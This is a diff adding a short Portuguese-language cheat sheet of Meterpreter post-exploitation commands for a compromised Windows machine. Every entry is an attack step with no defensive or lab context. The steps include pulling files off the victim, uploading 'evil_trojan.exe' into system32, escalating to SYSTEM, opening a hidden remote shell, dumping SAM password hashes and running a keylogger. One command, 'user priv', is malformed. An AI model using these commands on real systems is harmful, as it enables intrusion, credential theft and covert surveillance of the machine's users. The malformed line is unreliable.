@@ -1,0 +1,40 @@
+Listar arquivos
+meterpreter > ls
+
+Copiar um arquivo
+meterpreter > download c:\\boot.ini
+
+Enviar um arquivo
+meterpreter > upload evil_trojan.exe c:\\windows\\system32
+
+Visualizar informações de rede
+meterpreter > ipconfig
+Exibir qual o usuários está executando o Meterpreter
+meterpreter > getuid
+
+Logar como system
+meterpreter > getsystem
+
+
+Ganhar privilegios
+meterpreter > user priv
+
+Executar um comando na maquina remota
+meterpreter > execute -f cmd.exe -i –H
+
+Usar o shell (prompt) remoto
+meterpreter > shell
+Exibir o tempo de ociosidade do sistema remoto
+meterpreter > idletime
+
+Exibir a lista do banco de dados SAM
+meterpreter > run post/windows/gather/hashdump
+
+Iniciar um keylogger nativo do meterpreter
+meterpreter > keyscan_start
+
+Para o keylogger
+meterpreter > keyscan_stop
+
+Analisar o que foi capturado
+meterpreter > keyscan_dump
